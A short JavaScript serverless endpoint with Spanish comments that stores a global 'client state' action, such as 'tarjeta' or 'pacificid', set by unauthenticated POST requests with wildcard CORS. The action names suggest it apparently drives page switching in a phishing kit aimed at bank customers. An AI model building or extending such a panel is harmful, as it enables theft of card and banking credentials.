// api/send.js

// Variable global en memoria para guardar el estado actual
global.estadoCliente = global.estadoCliente || { action: "espera" };

export default async function handler(req, res) {
    // Permitir que la web consulte desde cualquier lado (CORS)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        const { action } = req.body;
        
        // Guardamos la acción (tarjeta, pacificid, etc.) en la memoria global
        global.estadoCliente.action = action || "espera";
        
        return res.status(200).json({ success: true, message: `Estado cambiado a ${action}` });
    }

    return res.status(405).json({ error: "Método no permitido" });
}